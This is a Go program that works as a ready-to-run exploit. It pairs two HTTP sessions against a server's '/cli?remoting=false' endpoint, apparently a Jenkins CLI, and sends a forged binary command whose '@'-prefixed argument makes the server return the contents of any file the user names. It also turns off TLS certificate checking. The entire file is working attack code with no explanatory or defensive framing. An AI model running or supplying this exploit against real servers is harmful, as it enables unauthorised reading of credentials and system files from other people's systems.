package main

import (
	"bytes"
	"crypto/tls"
	"encoding/hex"
	"errors"
	"fmt"
	"github.com/google/uuid"
	"io"
	"log"
	"net/http"
	"os"
	"time"
)

func init() {
	http.DefaultClient.Transport = &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
}

func main() {
	rootUrl := os.Args[1]
	command := os.Args[2]
	targetFile := os.Args[3]
	sessionId := uuid.New().String()
	doneChan := make(chan bool)
	log.Println("Starting download request")
	if err := waitForResp(rootUrl, sessionId, doneChan); err != nil {
		panic(err)
	}
	log.Println("Download request pending")
	log.Println("Sending forged command")
	if err := requestFile(rootUrl, command, targetFile, sessionId); err != nil {
		panic(err)
	}
	<-doneChan
}

func requestFile(rootUrl string, command string, targetFile string, sessionId string) error {
	targetFile = "@" + targetFile
	targetFileNameLength := len(targetFile)
	commandLength := len(command)
	payload := "\x00\x00\x00" + string(byte(commandLength+2)) + "\x00\x00" + string(byte(commandLength)) + command + "\x00\x00\x00" + string(byte(targetFileNameLength+2)) + "\x00\x00" + string(byte(targetFileNameLength)) + targetFile + string([]byte{0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x03, 0x6e, 0x6f, 0x74, 0x00, 0x00, 0x00, 0x07, 0x02, 0x00, 0x05, 0x55, 0x54, 0x46, 0x2d, 0x38, 0x00, 0x00, 0x00, 0x07, 0x01, 0x00, 0x05, 0x65, 0x6e, 0x5f, 0x55, 0x53, 0x00, 0x00, 0x00, 0x00, 0x03})
	fmt.Println(hex.Dump([]byte(payload)))
	req, err := http.NewRequest(http.MethodPost, rootUrl+"/cli?remoting=false", bytes.NewBufferString(payload))
	if err != nil {
		return err
	}
	req.Header.Set("Session", sessionId)
	req.Header.Set("Side", "upload")
	req.Header.Set("Content-Type", "application/octet-stream")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return err
	}
	if resp.StatusCode != http.StatusOK {
		log.Println(resp.Status)
		return errors.New("upload request error")
	}
	resp.Body.Close()
	return nil
}

func waitForResp(rootUrl string, sessionId string, doneChan chan bool) error {
	req, err := http.NewRequest(http.MethodPost, rootUrl+"/cli?remoting=false", nil)
	if err != nil {
		return err
	}
	req.Header.Set("Session", sessionId)
	req.Header.Set("Side", "download")
	go func() {
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			panic(err)
		}
		log.Println("request done")
		if resp.StatusCode != http.StatusOK {
			panic(errors.New("download request error"))
		}
		defer resp.Body.Close()
		io.Copy(os.Stdout, resp.Body)
		doneChan <- true
	}()
	time.Sleep(100 * time.Millisecond)
	return nil
}
